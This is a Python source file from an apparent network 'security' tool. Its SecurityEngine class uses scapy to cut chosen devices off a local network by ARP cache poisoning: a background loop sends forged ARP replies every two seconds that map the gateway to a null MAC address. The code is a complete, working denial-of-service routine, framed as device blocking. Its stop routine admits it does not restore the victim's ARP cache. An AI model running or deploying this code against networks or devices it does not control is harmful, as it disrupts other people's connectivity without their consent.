import threading
import time
import logging
from scapy.all import ARP, send, conf
import asyncio

logger = logging.getLogger("NetGuard-Security")

class SecurityEngine:
    def __init__(self):
        self.blocking_tasks = {} # {target_ip: stop_event}
        self.gateway_ip = None
        self.interface = None
        self._lock = threading.Lock()

    def set_config(self, interface, gateway_ip):
        self.interface = interface
        self.gateway_ip = gateway_ip

    def start_blocking(self, target_ip, target_mac):
        """Starts a background thread to disrupt the connection of target_ip via ARP poisoning."""
        with self._lock:
            if target_ip in self.blocking_tasks:
                return False # Already blocking
            
            if not self.gateway_ip:
                logger.error("Cannot block: Gateway IP not set")
                return False

            stop_event = threading.Event()
            thread = threading.Thread(
                target=self._disruption_loop, 
                args=(target_ip, target_mac, stop_event),
                daemon=True
            )
            self.blocking_tasks[target_ip] = {"stop_event": stop_event, "thread": thread}
            thread.start()
            logger.warning(f"SECURITY: Started blocking device {target_ip}")
            return True

    def stop_blocking(self, target_ip):
        """Stops the disruption and attempts to restore the target's ARP cache."""
        with self._lock:
            if target_ip in self.blocking_tasks:
                task = self.blocking_tasks[target_ip]
                task["stop_event"].set()
                task["thread"].join(timeout=2)
                del self.blocking_tasks[target_ip]
                
                # Attempt to restore ARP cache (send correct info)
                # This requires knowing the real gateway MAC
                # For now, we rely on the device eventually fixing itself or broadcast
                logger.info(f"SECURITY: Stopped blocking device {target_ip}")
                return True
            return False

    def is_blocking(self, target_ip):
        with self._lock:
            return target_ip in self.blocking_tasks

    def _disruption_loop(self, target_ip, target_mac, stop_event):
        """Periodic ARP poisoning loop."""
        # Use a non-existent MAC for the gateway to disrupt the path
        FAKE_MAC = "00:00:00:00:00:00"
        
        logger.info(f"Disruption loop started for {target_ip}")
        while not stop_event.is_set():
            try:
                # Tell the target that the gateway is at FAKE_MAC
                pkt = ARP(
                    op=2, 
                    pdst=target_ip, 
                    hwdst=target_mac, 
                    psrc=self.gateway_ip, 
                    hwsrc=FAKE_MAC
                )
                send(pkt, iface=self.interface, verbose=False)
                
                # We can also tell the gateway that the target is at FAKE_MAC
                # (Bidirectional disruption)
                # But usually disrupting the target is enough for "no internet"
                
                time.sleep(2) # Send every 2 seconds to keep cache poisoned
            except Exception as e:
                logger.error(f"Disruption Error for {target_ip}: {e}")
                break
        logger.info(f"Disruption loop stopped for {target_ip}")

security_engine = SecurityEngine()
